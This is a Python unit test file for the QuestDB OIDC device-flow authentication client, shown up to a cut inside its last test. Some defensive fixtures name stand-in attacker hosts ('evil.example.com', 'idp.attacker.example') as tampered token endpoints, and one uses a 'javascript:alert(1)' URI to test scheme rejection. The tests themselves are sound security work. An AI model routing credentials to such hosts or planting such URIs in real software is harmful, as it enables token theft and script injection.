#!/usr/bin/env python3
################################################################################
##     ___                  _   ____  ____
##    / _ \ _   _  ___  ___| |_|  _ \| __ )
##   | | | | | | |/ _ \/ __| __| | | |  _ \
##   | |_| | |_| |  __/\__ \ |_| |_| | |_) |
##    \__\_\\__,_|\___||___/\__|____/|____/
##
##  Copyright (c) 2014-2019 Appsicle
##  Copyright (c) 2019-2024 QuestDB
##
##  Licensed under the Apache License, Version 2.0 (the "License");
##  you may not use this file except in compliance with the License.
##  You may obtain a copy of the License at
##
##  http://www.apache.org/licenses/LICENSE-2.0
##
##  Unless required by applicable law or agreed to in writing, software
##  distributed under the License is distributed on an "AS IS" BASIS,
##  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
##  See the License for the specific language governing permissions and
##  limitations under the License.
##
################################################################################

"""
Standalone unit tests for ``questdb.auth``.

These do not require the compiled ``questdb.ingress`` extension; they exercise
the device flow, discovery, caching, refresh and the REST adapter against an
in-process mock IdP + mock QuestDB server.

Run directly::

    python3 test/test_auth.py -v
"""

import base64
import importlib.util
import json
import os
import sys
import threading
import types
import unittest
import http.server
import urllib.parse
from unittest import mock

sys.dont_write_bytecode = True
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from questdb.auth import (  # noqa: E402
    OidcDeviceAuth,
    QuestDB,
    connect,
    OidcError,
    OidcConfigError,
    OidcDeviceFlowError,
    OidcTimeoutError,
    OidcInteractionRequired,
    OidcAuthError,
    OidcNetworkError,
    TokenSet,
)
from questdb.auth._cache import MemoryCache, _MEMORY_STORE  # noqa: E402
from questdb.auth._render import Renderer  # noqa: E402

try:
    import pandas as pd
except ImportError:
    pd = None

_HAS_PG_DRIVER = (
    importlib.util.find_spec('psycopg') is not None
    or importlib.util.find_spec('psycopg2') is not None)


class _FakeAuth:
    """A stand-in OidcDeviceAuth for adapter tests (no network)."""

    _ctx = None

    def __init__(self, token='TKN'):
        self._token = token
        self.calls = 0

    def token(self):
        self.calls += 1
        return self._token

    def headers(self):
        return {'Authorization': f'Bearer {self._token}'}


def _jwt(claims):
    """Build an unsigned JWT-shaped string with the given payload claims."""
    def b64(obj):
        raw = json.dumps(obj).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()
    return f'{b64({"alg": "none"})}.{b64(claims)}.sig'


ID_TOKEN = _jwt({'sub': 'user-1', 'email': 'alice@example.com',
                 'groups': ['analysts']})
ACCESS_TOKEN = _jwt({'sub': 'user-1', 'scope': 'openid'})


class FakeClock:
    """Deterministic clock: ``sleep`` advances both monotonic and wall time."""

    def __init__(self):
        self.mono = 0.0
        self.wall = 1_000_000.0
        self.sleeps = []

    def sleep(self, dt):
        self.sleeps.append(dt)
        self.mono += dt
        self.wall += dt

    def monotonic(self):
        return self.mono

    def now(self):
        return self.wall


class MockState:
    """Scriptable behaviour shared with the request handler."""

    def __init__(self):
        self.settings = {}
        self.well_known = None
        # FIFO of (status, body) returned for device_code grant polls.
        # When exhausted, the last entry repeats.
        self.token_script = [(200, None)]  # None => default success body
        self.refresh_response = None       # (status, body) or None
        self.device_response = None        # override device-auth response body
        self.device_status = 200
        self.expected_bearer = None        # for /exec auth check
        self.exec_response = None
        self.exec_status = 200
        self.exec_raw = None               # (status, content_type, bytes) override
        # Recording.
        self.device_requests = 0
        self.token_requests = []
        self.refresh_requests = 0
        self.exec_requests = []


class _Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    @property
    def state(self):
        return self.server.state

    def _send_json(self, status, obj):
        data = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _read_form(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        return {k: v[0] for k, v in urllib.parse.parse_qs(body).items()}

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == '/settings':
            self._send_json(200, self.state.settings)
        elif path == '/.well-known/openid-configuration':
            if self.state.well_known is None:
                self._send_json(404, {'error': 'not found'})
            else:
                self._send_json(200, self.state.well_known)
        elif path == '/exec':
            auth = self.headers.get('Authorization')
            if self.state.expected_bearer and auth != (
                    'Bearer ' + self.state.expected_bearer):
                self._send_json(401, {'error': 'unauthorized'})
                return
            self.state.exec_requests.append(self.path)
            if self.state.exec_raw is not None:
                status, ctype, raw = self.state.exec_raw
                self.send_response(status)
                self.send_header('Content-Type', ctype)
                self.send_header('Content-Length', str(len(raw)))
                self.end_headers()
                self.wfile.write(raw)
                return
            self._send_json(self.state.exec_status, self.state.exec_response or {
                'columns': [
                    {'name': 'ts', 'type': 'TIMESTAMP'},
                    {'name': 'price', 'type': 'DOUBLE'},
                ],
                'dataset': [
                    ['2021-01-01T00:00:00.000000Z', 1.5],
                    ['2021-01-02T00:00:00.000000Z', 2.5],
                ],
                'count': 2,
            })
        else:
            self._send_json(404, {'error': 'not found'})

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        form = self._read_form()
        if path == '/device':
            self.state.device_requests += 1
            if self.state.device_status != 200:
                self._send_json(self.state.device_status,
                                self.state.device_response or
                                {'error': 'invalid_client'})
                return
            body = self.state.device_response or {
                'device_code': 'DEV-CODE',
                'user_code': 'WDJB-MJHT',
                'verification_uri': 'https://idp.example.com/device',
                'verification_uri_complete':
                    'https://idp.example.com/device?user_code=WDJB-MJHT',
                'expires_in': 600,
                'interval': 5,
            }
            self._send_json(200, body)
        elif path == '/token':
            grant = form.get('grant_type')
            if grant == 'refresh_token':
                self.state.refresh_requests += 1
                status, body = self.state.refresh_response or (
                    200, self._default_token_body())
                self._send_json(status, body)
                return
            self.state.token_requests.append(form)
            idx = min(len(self.state.token_requests) - 1,
                      len(self.state.token_script) - 1)
            status, body = self.state.token_script[idx]
            if body is None:
                body = self._default_token_body()
            self._send_json(status, body)
        else:
            self._send_json(404, {'error': 'not found'})

    @staticmethod
    def _default_token_body():
        return {
            'access_token': ACCESS_TOKEN,
            'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-1',
            'token_type': 'Bearer',
            'expires_in': 3600,
            'scope': 'openid groups',
        }


class _MockServer(http.server.HTTPServer):
    def __init__(self):
        super().__init__(('127.0.0.1', 0), _Handler)
        self.state = MockState()


class AuthTestBase(unittest.TestCase):
    def setUp(self):
        _MEMORY_STORE.clear()
        self.server = _MockServer()
        self.state = self.server.state
        self.thread = threading.Thread(
            target=lambda: self.server.serve_forever(poll_interval=0.02),
            daemon=True)
        self.thread.start()
        self.base = f'http://127.0.0.1:{self.server.server_port}'

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)

    def make_auth(self, *, clock=None, groups_in_token=True, cache='memory',
                  interactive=True, **kw):
        clock = clock or FakeClock()
        self._clock = clock
        return OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            scope='openid groups',
            groups_in_token=groups_in_token,
            cache=cache,
            insecure=True,
            interactive=interactive,
            renderer=Renderer(),
            _clock=clock,
            **kw)


class TestDeviceFlow(AuthTestBase):
    def test_happy_path_returns_id_token(self):
        self.state.token_script = [
            (400, {'error': 'authorization_pending'}),
            (400, {'error': 'authorization_pending'}),
            (200, None),
        ]
        auth = self.make_auth()
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        # 3 token polls, slept 'interval' (5s) before each.
        self.assertEqual(len(self.state.token_requests), 3)
        self.assertEqual(self._clock.sleeps, [5, 5, 5])

    def test_access_token_when_groups_not_in_token(self):
        auth = self.make_auth(groups_in_token=False)
        self.assertEqual(auth.token(), ACCESS_TOKEN)

    def test_headers(self):
        auth = self.make_auth()
        self.assertEqual(auth.headers(),
                         {'Authorization': 'Bearer ' + ID_TOKEN})

    def test_slow_down_backs_off(self):
        self.state.token_script = [
            (400, {'error': 'slow_down'}),
            (200, None),
        ]
        auth = self.make_auth()
        auth.token()
        # interval starts at 5, +5 after slow_down.
        self.assertEqual(self._clock.sleeps, [5, 10])

    def test_timeout_when_never_authorized(self):
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 10, 'interval': 5,
        }
        self.state.token_script = [(400, {'error': 'authorization_pending'})]
        auth = self.make_auth()
        with self.assertRaises(OidcTimeoutError):
            auth.token()

    def test_nonpositive_expires_in_still_polls(self):
        # A non-positive expires_in in the device-auth response must be treated
        # as unknown, not as "already expired" — otherwise the flow times out
        # before its first poll even though the user can still authorize. M2.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 0, 'interval': 5,
        }
        self.state.token_script = [(200, None)]  # success on the first poll
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(len(self.state.token_requests), 1)  # it actually polled

    def test_oversized_interval_is_clamped(self):
        # A hostile/huge interval must not pin the polling thread (which holds
        # the acquisition lock) in one enormous sleep; the per-poll sleep is
        # capped at _MAX_POLL_INTERVAL. M2.
        from questdb.auth._device import _MAX_POLL_INTERVAL
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 600, 'interval': 10 ** 9,
        }
        self.state.token_script = [(200, None)]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(self._clock.sleeps)
        self.assertLessEqual(max(self._clock.sleeps), _MAX_POLL_INTERVAL)

    def test_oversized_expires_in_is_capped(self):
        # A hostile expires_in must not keep the poll loop (and the lock) alive
        # indefinitely; the lifetime is capped so a never-authorized flow still
        # terminates promptly rather than looping millions of times. M2.
        from questdb.auth._device import (
            _MAX_DEVICE_CODE_LIFETIME, _MAX_POLL_INTERVAL)
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 10 ** 9, 'interval': 10 ** 9,  # interval clamps too
        }
        self.state.token_script = [(400, {'error': 'authorization_pending'})]
        auth = self.make_auth()
        with self.assertRaises(OidcTimeoutError):
            auth.token()
        max_polls = _MAX_DEVICE_CODE_LIFETIME // _MAX_POLL_INTERVAL + 1
        self.assertLessEqual(len(self.state.token_requests), max_polls)

    def test_access_denied_is_surfaced(self):
        self.state.token_script = [
            (400, {'error': 'access_denied',
                   'error_description': 'user said no'}),
        ]
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        self.assertEqual(cm.exception.error, 'access_denied')
        self.assertIn('user said no', str(cm.exception))

    def test_device_endpoint_rejects_grant(self):
        self.state.device_status = 400
        self.state.device_response = {'error': 'invalid_client'}
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        self.assertIn('device grant', str(cm.exception))

    def test_token_caches_in_memory_across_instances(self):
        self.make_auth().token()
        self.assertEqual(self.state.device_requests, 1)
        # A brand-new instance with the same config reuses the cached token.
        self.make_auth().token()
        self.assertEqual(self.state.device_requests, 1)

    def test_groups_mode_missing_id_token_fails_without_caching(self):
        # groups_in_token=True but the completed grant carries only an
        # access_token: the poll must reject it as a terminal flow error and
        # NOT cache it (otherwise every later token() re-runs the whole
        # interactive flow). See M1.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})]  # no id_token
        auth = self.make_auth(groups_in_token=True)
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()
        self.assertIsNone(auth._tokens)  # nothing was cached

    def test_groups_mode_accepts_id_token_without_access_token(self):
        # A completed grant that returns only an id_token (no access_token) is
        # usable in groups mode and must be returned, not discarded as it was
        # when success gated on access_token. See M1.
        self.state.token_script = [(200, {
            'id_token': ID_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})]  # no access_token
        auth = self.make_auth(groups_in_token=True)
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_200_without_access_token_is_not_success(self):
        # A 200 with no access_token must not be treated as a token.
        self.state.token_script = [(200, {'token_type': 'Bearer'})]
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()

    def test_access_token_headers(self):
        auth = self.make_auth(groups_in_token=False)
        self.assertEqual(auth.headers(),
                         {'Authorization': 'Bearer ' + ACCESS_TOKEN})

    def test_clear_forces_resignin(self):
        auth = self.make_auth()
        auth.token()
        self.assertEqual(self.state.device_requests, 1)
        auth.clear()
        auth.token()
        self.assertEqual(self.state.device_requests, 2)  # prompted again

    def test_openid_scope_auto_added_for_groups_in_token(self):
        # groups-in-token requires an id_token, which needs the openid scope.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            scope='groups', groups_in_token=True,  # no 'openid'
            cache='memory', insecure=True, renderer=Renderer())
        self.assertIn('openid', auth.config.scope.split())

    def test_zero_expires_in_is_treated_as_unknown(self):
        # A non-positive expires_in must not mark the just-issued token expired.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 0})]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_short_lived_token_valid_at_issue(self):
        # A small positive expires_in (< 2*skew) must not read as expired the
        # instant it is issued (adaptive skew = min(skew, lifetime/2)).
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 20})]
        auth = self.make_auth()
        auth.token()
        t = auth._tokens
        self.assertEqual(round(t.expires_at - t.issued_at), 20)
        self.assertTrue(t.is_valid(t.issued_at))    # usable right after issue
        self.assertFalse(t.is_valid(t.expires_at))  # but still does expire

    def test_open_browser_rejects_dangerous_scheme(self):
        auth = self.make_auth(open_browser=True)
        with mock.patch('webbrowser.open') as opener:
            auth._maybe_open_browser({'verification_uri': 'javascript:alert(1)'})
            opener.assert_not_called()
            auth._maybe_open_browser(
                {'verification_uri': 'https://idp.example.com/device'})
            opener.assert_called_once_with('https://idp.example.com/device')

    def test_memory_cache_returns_independent_copy(self):
        cache = MemoryCache()
        stored = TokenSet(access_token='a', refresh_token='r', expires_at=1.0)
        cache.store('k', stored)
        # Each load is a distinct copy — never the object handed to store(), nor
        # shared between loads — so a cached entry can't be aliased and reused.
        first = cache.load('k')
        second = cache.load('k')
        self.assertIsNot(first, stored)
        self.assertIsNot(first, second)
        self.assertEqual(first.refresh_token, 'r')

    def test_tokenset_is_frozen(self):
        # TokenSet is immutable: the lock-free fast path reads a published
        # TokenSet without a lock, which is only safe if its fields never change
        # after construction. Mutating one must raise, not silently succeed.
        import dataclasses
        t = TokenSet(access_token='a', refresh_token='r', expires_at=1.0)
        with self.assertRaises(dataclasses.FrozenInstanceError):
            t.refresh_token = 'MUTATED'
        # Deriving a modified copy is the supported idiom.
        t2 = dataclasses.replace(t, refresh_token='r2')
        self.assertEqual(t.refresh_token, 'r')
        self.assertEqual(t2.refresh_token, 'r2')

    def test_tokenset_repr_redacts_secrets(self):
        # The access/id/refresh tokens must never appear in repr() — a TokenSet
        # landing in a log line or traceback would otherwise leak credentials.
        r = repr(TokenSet(access_token='SECRET-A', id_token='SECRET-I',
                          refresh_token='SECRET-R', scope='openid'))
        self.assertNotIn('SECRET-A', r)
        self.assertNotIn('SECRET-I', r)
        self.assertNotIn('SECRET-R', r)
        self.assertIn('openid', r)  # non-secret metadata still shown


class TestNonInteractive(AuthTestBase):
    def test_non_interactive_raises_without_polling(self):
        auth = self.make_auth(interactive=False)
        with self.assertRaises(OidcInteractionRequired):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)


class TestRefresh(AuthTestBase):
    def _seed_expired(self, auth, refresh_token='REFRESH-1'):
        expired = TokenSet(
            access_token='old-access', id_token='old-id',
            refresh_token=refresh_token,
            expires_at=self._clock.now() - 10)
        auth._cache.store(auth.cache_key, expired)

    def test_silent_refresh(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)  # no re-prompt

    def test_refresh_failure_falls_back_to_device_flow(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (400, {'error': 'invalid_grant'})
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 1)  # re-prompted

    def test_refresh_token_preserved_when_not_rotated(self):
        auth = self.make_auth()
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 3600})  # no new refresh
        auth.token()
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')

    def test_refresh_without_id_token_falls_back_to_device_flow(self):
        # groups_in_token=True but the IdP's refresh omits the id_token: the
        # refresh is unusable, so fall back to the interactive flow rather than
        # caching it and looping (the device flow yields a complete token).
        auth = self.make_auth(groups_in_token=True)
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})  # no id_token
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)            # from the device flow
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 1)  # fell back

    def test_refresh_without_id_token_non_interactive_does_not_loop(self):
        # Same situation but non-interactive: surface a clear error rather than
        # repeatedly re-running a refresh that can never satisfy _select.
        auth = self.make_auth(groups_in_token=True, interactive=False)
        self._seed_expired(auth)
        self.state.refresh_response = (200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})  # no id_token
        with self.assertRaises(OidcInteractionRequired):
            auth.token()
        self.assertEqual(self.state.device_requests, 0)

    def test_cached_token_missing_required_kind_is_refreshed(self):
        # A cached, non-expired token that lacks the required kind (here:
        # access_token in non-groups mode) must not pass the cache gate and
        # then hard-fail in _select; it should trigger a refresh instead.
        auth = self.make_auth(groups_in_token=False)
        auth._cache.store(auth.cache_key, TokenSet(
            access_token=None, id_token='id', refresh_token='REFRESH-1',
            expires_at=self._clock.now() + 3600))
        token = auth.token()
        self.assertEqual(token, ACCESS_TOKEN)
        self.assertEqual(self.state.refresh_requests, 1)
        self.assertEqual(self.state.device_requests, 0)

    def test_refresh_network_error_propagates_without_reprompt(self):
        # Both endpoints point at a closed port (same origin, so the co-location
        # check passes), so the refresh POST fails at the transport layer. The
        # error must propagate from the *token* endpoint (the refresh), proving
        # the flow did NOT fall back to the device flow on a transient blip.
        clock = FakeClock()
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint='http://127.0.0.1:1/device',
            token_endpoint='http://127.0.0.1:1/token',  # connection refused
            scope='openid groups', groups_in_token=True, cache='memory',
            insecure=True, interactive=True, renderer=Renderer(),
            _clock=clock)
        expired = TokenSet(
            access_token='old', id_token='old-id', refresh_token='REFRESH-1',
            expires_at=clock.now() - 10)
        auth._cache.store(auth.cache_key, expired)

        with self.assertRaises(OidcNetworkError) as cm:
            auth.token()
        # The error is from the refresh (token endpoint), not a device-flow
        # fallback (device endpoint), and the refresh token is kept for a retry.
        self.assertIn('/token', str(cm.exception))
        self.assertEqual(auth._tokens.refresh_token, 'REFRESH-1')


class TestDiscovery(AuthTestBase):
    def test_from_questdb_reads_settings(self):
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid groups',
            'acl.oidc.groups.encoded.in.token': True,
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        self.assertEqual(auth.config.client_id, 'questdb')
        self.assertTrue(auth.config.groups_in_token)
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_well_known_fallback_for_device_endpoint(self):
        # Settings advertise OIDC + token endpoint but NOT the device endpoint;
        # issuer= is pinned, so the IdP .well-known fallback is allowed.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid',
            'acl.oidc.groups.encoded.in.token': False,
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        auth = OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                           insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')

    def test_device_fallback_without_issuer_is_rejected(self):
        # M4: QuestDB advertises the token endpoint but not the device
        # endpoint, and no issuer is pinned. Discovery would otherwise be
        # steered by the (possibly tampered) /settings response, so refuse and
        # demand an out-of-band issuer pin — even though a usable .well-known
        # is reachable here, it must NOT be fetched.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        with self.assertRaises(OidcConfigError) as cm:
            OidcDeviceAuth.from_questdb(self.base, insecure=True)
        self.assertIn('issuer', str(cm.exception))

    def test_device_fallback_with_discovery_url_is_accepted(self):
        # discovery_url= is an out-of-band pin too, accepted in lieu of issuer=.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        auth = OidcDeviceAuth.from_questdb(
            self.base,
            discovery_url=self.base + '/.well-known/openid-configuration',
            insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')

    def test_oidc_disabled_raises(self):
        self.state.settings = {'config': {'acl.oidc.enabled': False}}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_missing_device_endpoint_raises(self):
        # issuer= is pinned (so the fallback is allowed), but the IdP's
        # discovery doc carries no device_authorization_endpoint: that is the
        # error under test, not the missing-issuer guard above.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {'issuer': self.base,
                                 'token_endpoint': self.base + '/token'}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_malformed_endpoint_port_raises_config_error(self):
        # /settings advertising a non-integer port in an endpoint must raise
        # OidcConfigError (the typed contract), not a bare ValueError that
        # callers catching OidcError would miss. See M6.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://idp:notaport/token',
            'acl.oidc.device.authorization.endpoint':
                'https://idp:notaport/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_loopback_flow_not_implemented(self):
        # Reserved-but-unimplemented flow raises an OidcError subclass so it's
        # caught by `except OidcError` like other config problems.
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, flow='loopback',
                                        insecure=True)

    def test_endpoint_origin_mismatch_rejected(self):
        # /settings advertises the device endpoint on a different origin than
        # the token endpoint: refuse rather than POST credentials off-origin.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint':
                'http://127.0.0.2:9/device',  # different host:port
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_issuer_pin_rejects_off_origin_endpoints(self):
        # Endpoints are internally consistent, but an explicit issuer pins them
        # to a different origin -> reject (a compromised /settings can't
        # redirect the token POST when the IdP is pinned).
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(
                self.base, issuer='https://idp.attacker.example',
                insecure=True)

    def test_issuer_pin_accepts_matching_origin(self):
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        auth = OidcDeviceAuth.from_questdb(
            self.base, issuer=self.base, insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')


class TestInsecureSettingsGuard(unittest.TestCase):
    """
    M1: a /settings response fetched over plaintext http to a non-loopback host
    (only reachable with insecure=True) is MITM-able, so IdP endpoints it
    advertises must not be trusted to route the device code / refresh token
    without an out-of-band issuer/discovery_url pin — even when BOTH endpoints
    are present (so the co-location check would otherwise pass trivially).
    """

    _TAMPERED = {
        'acl.oidc.enabled': True,
        'acl.oidc.client.id': 'questdb',
        'acl.oidc.token.endpoint': 'https://evil.example.com/token',
        'acl.oidc.device.authorization.endpoint':
            'https://evil.example.com/device',
    }

    def _resolve(self, settings, **kw):
        # Stub the network: /settings returns the given (possibly tampered) map,
        # and IdP discovery must never be contacted in these guard paths.
        from questdb.auth import _discovery
        with mock.patch.object(_discovery, 'fetch_settings',
                               return_value=settings), \
             mock.patch.object(
                 _discovery, 'discover_device_endpoint_from_idp',
                 side_effect=AssertionError('IdP discovery must not run')):
            return _discovery.resolve_config(**kw)

    def test_both_endpoints_over_plaintext_without_pin_rejected(self):
        # The M1 case: both endpoints present at one (attacker) origin, plaintext
        # channel, no pin -> refuse, and never contact the IdP.
        with self.assertRaises(OidcConfigError) as cm:
            self._resolve(self._TAMPERED,
                          questdb_url='http://qdb.internal.example:9000',
                          insecure=True)
        self.assertIn('issuer', str(cm.exception))

    def test_plaintext_guard_does_not_fire_for_loopback(self):
        # Loopback http never leaves the host, so /settings is not MITM-able;
        # the guard must not fire (the common local-dev path).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='http://127.0.0.1:9000', insecure=True)
        self.assertEqual(cfg.token_endpoint, 'https://evil.example.com/token')

    def test_plaintext_guard_does_not_fire_over_https(self):
        # Over https /settings is authenticated by TLS; the documented
        # trust-the-server behavior is preserved (issuer= stays optional).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='https://qdb.example.com:9000')
        self.assertEqual(cfg.device_authorization_endpoint,
                         'https://evil.example.com/device')

    def test_explicit_endpoints_over_plaintext_are_trusted(self):
        # Endpoints the caller passed explicitly are not /settings-supplied, so
        # the guard must not force a pin even over a plaintext channel.
        cfg = self._resolve(
            {'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb'},
            questdb_url='http://qdb.internal.example:9000', insecure=True,
            token_endpoint='https://idp.example.com/token',
            device_authorization_endpoint='https://idp.example.com/device')
        self.assertEqual(cfg.token_endpoint, 'https://idp.example.com/token')

    def test_pin_satisfies_guard_over_plaintext(self):
        # With an out-of-band issuer pin the guard is satisfied (the actual
        # origin validation then happens in OidcDeviceAuth.__init__).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='http://qdb.internal.example:9000',
                            insecure=True, issuer='https://evil.example.com')
        self.assertEqual(cfg.token_endpoint, 'https://evil.example.com/token')


@unittest.skipIf(pd is None, 'pandas not installed')
class TestRestAdapter(AuthTestBase):
    def _connected(self):
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid groups',
            'acl.oidc.groups.encoded.in.token': True,
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        self.state.expected_bearer = ID_TOKEN
        return connect(self.base, insecure=True, renderer=Renderer(),
                       interactive=True, _clock=FakeClock())

    def test_sql_returns_dataframe(self):
        qdb = self._connected()
        df = qdb.sql('SELECT * FROM trades')
        self.assertEqual(list(df.columns), ['ts', 'price'])
        self.assertEqual(len(df), 2)
        self.assertEqual(df['price'].tolist(), [1.5, 2.5])
        # TIMESTAMP column coerced to datetime.
        self.assertTrue(str(df['ts'].dtype).startswith('datetime64'))

    def test_sql_unauthorized_maps_to_auth_error(self):
        qdb = self._connected()
        self.state.expected_bearer = 'something-else'  # force 401
        with self.assertRaises(OidcAuthError):
            qdb.sql('SELECT 1')

    def test_connect_is_eager(self):
        qdb = self._connected()
        self.assertIsInstance(qdb, QuestDB)
        # Sign-in already happened during connect().
        self.assertEqual(self.state.device_requests, 1)

    def test_sql_query_error_maps_to_oidc_error(self):
        qdb = self._connected()
        self.state.exec_status = 400
        self.state.exec_response = {'error': 'unexpected token', 'position': 5}
        with self.assertRaises(OidcError) as cm:
            qdb.sql('SELEKT 1')
        self.assertIn('unexpected token', str(cm.exception))
        self.assertNotIsInstance(cm.exception, OidcAuthError)

    def test_sql_passes_limit(self):
        qdb = self._connected()
        qdb.sql('SELECT * FROM trades', limit='1,10')
        self.assertTrue(any('limit=1' in p for p in self.state.exec_requests))

    def test_sql_handles_empty_dataset(self):
        qdb = self._connected()
